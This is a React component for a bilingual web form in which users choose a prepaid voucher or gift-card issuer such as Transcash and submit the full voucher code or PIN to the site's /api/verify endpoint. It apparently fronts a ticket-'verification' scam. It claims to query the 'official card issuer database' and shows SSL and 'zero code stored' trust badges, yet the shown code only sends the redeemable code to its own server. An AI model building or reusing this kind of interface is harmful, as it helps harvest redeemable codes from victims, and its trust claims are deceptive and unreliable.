import React, { useState, useEffect } from 'react';
import { TicketProvider, VerificationResult } from '../types';
import { VerificationLoading } from './VerificationLoading';
import { ResultCard } from './ResultCard';
import {
  ShieldCheck,
  CreditCard,
  Lock,
  ArrowRight,
  ClipboardPaste,
  HelpCircle,
  AlertCircle,
  Sparkles,
  Info,
  CheckCircle2,
  Eye,
  EyeOff
} from 'lucide-react';

interface VerificationFormProps {
  providers: TicketProvider[];
  initialCode?: string;
  initialProviderId?: string;
  onVerificationComplete?: (result: VerificationResult) => void;
  lang?: 'en' | 'fr';
}

export const VerificationForm: React.FC<VerificationFormProps> = ({
  providers,
  initialCode = '',
  initialProviderId = 'transcash',
  onVerificationComplete,
  lang = 'fr'
}) => {
  const [categoryFilter, setCategoryFilter] = useState<'all' | 'payment_card' | 'voucher' | 'gift_card'>('all');
  const [selectedProviderId, setSelectedProviderId] = useState<string>(initialProviderId);
  const [code, setCode] = useState<string>(initialCode);
  const [isCodeVisible, setIsCodeVisible] = useState<boolean>(false);
  const [isLoading, setIsLoading] = useState<boolean>(false);
  const [result, setResult] = useState<VerificationResult | null>(null);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [showHelper, setShowHelper] = useState<boolean>(false);

  const isEn = lang === 'en';

  // Sync props when initial code / provider changes
  useEffect(() => {
    if (initialCode) {
      setCode(initialCode);
    }
  }, [initialCode]);

  useEffect(() => {
    if (initialProviderId) {
      setSelectedProviderId(initialProviderId);
    }
  }, [initialProviderId]);

  const selectedProvider = providers.find((p) => p.id === selectedProviderId) || providers[0];

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      if (text) {
        setCode(text.trim());
        setErrorMessage(null);
      }
    } catch (e) {
      console.warn('Clipboard read failed', e);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMessage(null);

    const cleanCode = code.trim();
    if (!cleanCode) {
      setErrorMessage(isEn ? 'Please enter the voucher code or PIN.' : 'Veuillez saisir le numéro ou code du ticket.');
      return;
    }

    if (cleanCode.length < 5) {
      setErrorMessage(isEn ? 'The code entered is too short (minimum 5 characters required).' : 'Le code saisi est trop court (minimum 5 caractères requis).');
      return;
    }

    setIsLoading(true);

    try {
      const response = await fetch('/api/verify', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          providerId: selectedProvider.id,
          code: cleanCode
        })
      });

      const data = await response.json();

      if (!response.ok) {
        setErrorMessage(data.message || data.error || (isEn ? 'An error occurred during verification.' : 'Une erreur est survenue lors de la vérification.'));
        setIsLoading(false);
        return;
      }

      setResult(data);
      if (onVerificationComplete) {
        onVerificationComplete(data);
      }
    } catch (err) {
      setErrorMessage(isEn ? 'Unable to reach the verification server. Please check your connection.' : 'Impossible de joindre le serveur de vérification. Veuillez vérifier votre connexion.');
    } finally {
      setIsLoading(false);
    }
  };

  const handleReset = () => {
    setResult(null);
    setCode('');
    setErrorMessage(null);
  };

  // If result is displayed
  if (result) {
    return <ResultCard result={result} onReset={handleReset} lang={lang} />;
  }

  // If loading animation is active
  if (isLoading) {
    const maskedPreview = code.length > 4 ? `••••-${code.slice(-4)}` : '••••';
    return (
      <VerificationLoading
        providerName={selectedProvider?.name || 'Ticket'}
        maskedCode={maskedPreview}
        lang={lang}
      />
    );
  }

  return (
    <div className="w-full max-w-xl mx-auto">
      <div className="bg-white rounded-3xl shadow-xl shadow-slate-200/70 border border-slate-200/80 p-5 sm:p-8 relative">
        {/* Header inside card */}
        <div className="flex items-center justify-between pb-5 border-b border-slate-100">
          <div className="flex items-center gap-2.5">
            <div className="p-2 rounded-xl bg-blue-600 text-white shadow-xs">
              <ShieldCheck className="w-5 h-5" />
            </div>
            <div>
              <h2 className="text-lg sm:text-xl font-bold text-slate-900 leading-tight">
                {isEn ? 'Activate MyCard & Secure Check' : 'Vérification Sécurisée de Ticket'}
              </h2>
              <p className="text-xs text-slate-500">
                {isEn ? 'Direct query to official card issuer database' : "Interrogation instantanée du registre d'émission"}
              </p>
            </div>
          </div>
          <span className="inline-flex items-center gap-1 px-2.5 py-1 rounded-full bg-emerald-50 text-emerald-700 text-xs font-semibold border border-emerald-200/60">
            <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
            {isEn ? 'Server Ready' : 'Serveur Prêt'}
          </span>
        </div>

        <form onSubmit={handleSubmit} className="mt-6 space-y-6">
          {/* 1. Provider Selection */}
          <div>
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 mb-2.5">
              <label className="block text-xs font-bold uppercase tracking-wider text-slate-700">
                {isEn ? '1. Select Card or Voucher Issuer' : "1. Sélectionnez l'émetteur du ticket"}
              </label>

              {/* Category Filter Pills */}
              <div className="flex items-center gap-1 overflow-x-auto pb-1 sm:pb-0 scrollbar-none">
                <button
                  type="button"
                  onClick={() => setCategoryFilter('all')}
                  className={`px-2 py-0.5 rounded-full text-[10px] font-bold transition cursor-pointer whitespace-nowrap ${
                    categoryFilter === 'all'
                      ? 'bg-blue-600 text-white shadow-2xs'
                      : 'bg-slate-100 text-slate-600 hover:bg-slate-200'
                  }`}
                >
                  {isEn ? 'All' : 'Tous'} ({providers.filter((p) => p.isActive).length})
                </button>
                <button
                  type="button"
                  onClick={() => setCategoryFilter('voucher')}
                  className={`px-2 py-0.5 rounded-full text-[10px] font-bold transition cursor-pointer whitespace-nowrap ${
                    categoryFilter === 'voucher'
                      ? 'bg-teal-600 text-white shadow-2xs'
                      : 'bg-slate-100 text-slate-600 hover:bg-slate-200'
                  }`}
                >
                  {isEn ? 'Vouchers' : 'Vouchers'}
                </button>
                <button
                  type="button"
                  onClick={() => setCategoryFilter('payment_card')}
                  className={`px-2 py-0.5 rounded-full text-[10px] font-bold transition cursor-pointer whitespace-nowrap ${
                    categoryFilter === 'payment_card'
                      ? 'bg-blue-600 text-white shadow-2xs'
                      : 'bg-slate-100 text-slate-600 hover:bg-slate-200'
                  }`}
                >
                  {isEn ? 'Cards' : 'Cartes'}
                </button>
                <button
                  type="button"
                  onClick={() => setCategoryFilter('gift_card')}
                  className={`px-2 py-0.5 rounded-full text-[10px] font-bold transition cursor-pointer whitespace-nowrap ${
                    categoryFilter === 'gift_card'
                      ? 'bg-purple-600 text-white shadow-2xs'
                      : 'bg-slate-100 text-slate-600 hover:bg-slate-200'
                  }`}
                >
                  {isEn ? 'Gaming & Gifts' : 'Gaming & Cadeaux'}
                </button>
              </div>
            </div>

            <div className="grid grid-cols-2 sm:grid-cols-3 gap-2 max-h-72 sm:max-h-80 overflow-y-auto pr-1">
              {providers
                .filter((p) => p.isActive && (categoryFilter === 'all' || p.category === categoryFilter))
                .map((p) => {
                  const isSelected = p.id === selectedProviderId;
                  return (
                    <button
                      key={p.id}
                      type="button"
                      onClick={() => {
                        setSelectedProviderId(p.id);
                        setErrorMessage(null);
                      }}
                      className={`flex items-center gap-2 p-2.5 rounded-xl border text-left transition-all cursor-pointer ${
                        isSelected
                          ? 'border-blue-600 bg-blue-50/70 ring-2 ring-blue-600/20 shadow-xs'
                          : 'border-slate-200 hover:border-slate-300 hover:bg-slate-50/60 bg-white'
                      }`}
                    >
                      <span className={`w-3 h-3 rounded-full shrink-0 ${p.badgeColor}`} />
                      <div className="min-w-0 flex-1">
                        <span className={`text-xs font-bold truncate block ${isSelected ? 'text-blue-900' : 'text-slate-800'}`}>
                          {p.name}
                        </span>
                        <span className="text-[10px] text-slate-400 block truncate">
                          {p.codeFormat}
                        </span>
                      </div>
                    </button>
                  );
                })}
            </div>
          </div>

          {/* 2. Code Input */}
          <div>
            <div className="flex items-center justify-between mb-2">
              <label htmlFor="ticket-code-input" className="text-xs font-bold uppercase tracking-wider text-slate-700">
                {isEn ? '2. Enter Voucher Code or PIN' : '2. Saisissez le code ou numéro du ticket'}
              </label>
              <button
                type="button"
                onClick={() => setShowHelper(!showHelper)}
                className="inline-flex items-center gap-1 text-[11px] text-blue-600 hover:text-blue-800 font-semibold cursor-pointer"
              >
                <HelpCircle className="w-3.5 h-3.5" />
                <span>{isEn ? 'Where to find the code?' : 'Où trouver le code ?'}</span>
              </button>
            </div>

            {/* Helper Drawer */}
            {showHelper && selectedProvider && (
              <div className="mb-3 p-3 rounded-xl bg-blue-50/80 border border-blue-200/70 text-xs text-blue-900 animate-in fade-in duration-150">
                <p className="font-semibold mb-1">
                  {isEn ? `For ${selectedProvider.name} vouchers:` : `Pour les tickets ${selectedProvider.name} :`}
                </p>
                <p className="text-blue-800 leading-relaxed">{selectedProvider.helpTip}</p>
                <p className="text-[11px] text-blue-600 mt-1">
                  {isEn ? 'Standard format: ' : 'Format standard : '}
                  <code className="font-mono-code bg-white px-1.5 py-0.5 rounded border border-blue-200">{selectedProvider.placeholder}</code>
                </p>
              </div>
            )}

            <div className="relative rounded-2xl shadow-xs">
              <input
                id="ticket-code-input"
                type={isCodeVisible ? 'text' : 'password'}
                autoComplete="off"
                autoCorrect="off"
                spellCheck="false"
                value={code}
                onChange={(e) => {
                  setCode(e.target.value);
                  setErrorMessage(null);
                }}
                placeholder={selectedProvider?.placeholder || 'Ex: 1234 5678 9012'}
                className="w-full px-4 py-3.5 sm:py-4 rounded-2xl border-2 border-slate-200 focus:border-blue-600 focus:ring-4 focus:ring-blue-500/15 text-slate-900 font-mono-code text-base sm:text-lg tracking-wider placeholder:text-slate-400 placeholder:font-sans placeholder:tracking-normal transition outline-none pr-28 sm:pr-32"
              />

              {/* Action Buttons: Eye Toggle + Paste/Clear */}
              <div className="absolute right-2 top-1/2 -translate-y-1/2 flex items-center gap-1">
                {/* 1. Eye Toggle Button (Afficher / Masquer le code) */}
                <button
                  type="button"
                  onClick={() => setIsCodeVisible(!isCodeVisible)}
                  className="p-2 text-slate-400 hover:text-slate-700 hover:bg-slate-100 rounded-lg transition cursor-pointer flex items-center justify-center"
                  title={isCodeVisible ? (isEn ? 'Hide code' : 'Masquer le code') : (isEn ? 'Show code' : 'Afficher le code')}
                  aria-label={isCodeVisible ? (isEn ? 'Hide code' : 'Masquer le code') : (isEn ? 'Show code' : 'Afficher le code')}
                >
                  {isCodeVisible ? (
                    <EyeOff className="w-4 h-4 text-blue-600" />
                  ) : (
                    <Eye className="w-4 h-4 text-slate-400 hover:text-slate-600" />
                  )}
                </button>

                {/* 2. Paste or Clear Button */}
                {code ? (
                  <button
                    type="button"
                    onClick={() => setCode('')}
                    className="p-2 text-xs font-semibold text-slate-400 hover:text-slate-600 rounded-lg hover:bg-slate-100 transition cursor-pointer"
                    title={isEn ? 'Clear' : 'Effacer'}
                  >
                    {isEn ? 'Clear' : 'Effacer'}
                  </button>
                ) : (
                  <button
                    type="button"
                    onClick={handlePaste}
                    className="inline-flex items-center gap-1 px-2.5 py-1.5 rounded-lg bg-slate-100 hover:bg-slate-200 text-slate-700 text-xs font-medium transition cursor-pointer"
                    title={isEn ? 'Paste from clipboard' : 'Coller depuis le presse-papier'}
                  >
                    <ClipboardPaste className="w-3.5 h-3.5" />
                    <span>{isEn ? 'Paste' : 'Coller'}</span>
                  </button>
                )}
              </div>
            </div>

            {/* Hint below input */}
            <div className="flex items-center justify-between text-[11px] text-slate-400 mt-2 px-1">
              <span>{isEn ? 'Characters: ' : 'Caractères : '}{code.replace(/[\s-]/g, '').length}</span>
              <span>{selectedProvider?.codeFormat}</span>
            </div>
          </div>

          {/* Error message alert if any */}
          {errorMessage && (
            <div className="p-3.5 rounded-xl bg-rose-50 border border-rose-200 text-rose-800 text-xs flex items-start gap-2.5 animate-in shake duration-200">
              <AlertCircle className="w-4 h-4 text-rose-600 shrink-0 mt-0.5" />
              <div>
                <p className="font-bold">{isEn ? 'Verification Error' : 'Erreur de vérification'}</p>
                <p className="mt-0.5">{errorMessage}</p>
              </div>
            </div>
          )}

          {/* Verification Button (Big CTA) */}
          <button
            type="submit"
            disabled={isLoading}
            className="w-full py-4 px-6 rounded-2xl bg-gradient-to-r from-blue-600 via-indigo-600 to-blue-700 hover:from-blue-700 hover:to-indigo-700 active:scale-98 text-white font-extrabold text-base sm:text-lg shadow-lg shadow-blue-500/25 transition-all flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
          >
            <ShieldCheck className="w-5 h-5 stroke-[2.5]" />
            <span>{isEn ? 'Activate & Verify MyCard' : 'Vérifier la validité du ticket'}</span>
            <ArrowRight className="w-5 h-5 ml-1" />
          </button>

          {/* Security Assurance Guarantee */}
          <div className="pt-2 border-t border-slate-100 flex flex-col sm:flex-row items-center justify-center gap-3 sm:gap-6 text-xs text-slate-500">
            <div className="flex items-center gap-1.5">
              <Lock className="w-3.5 h-3.5 text-emerald-600" />
              <span>{isEn ? '256-bit SSL Encryption' : 'Chiffrement SSL 256-bit'}</span>
            </div>
            <div className="flex items-center gap-1.5">
              <ShieldCheck className="w-3.5 h-3.5 text-blue-600" />
              <span>{isEn ? 'Zero plain code stored' : 'Zéro code conservé en clair'}</span>
            </div>
            <div className="flex items-center gap-1.5">
              <CheckCircle2 className="w-3.5 h-3.5 text-slate-600" />
              <span>{isEn ? 'Instant Real-time Audit' : 'Audit instantané'}</span>
            </div>
          </div>
        </form>
      </div>
    </div>
  );
};
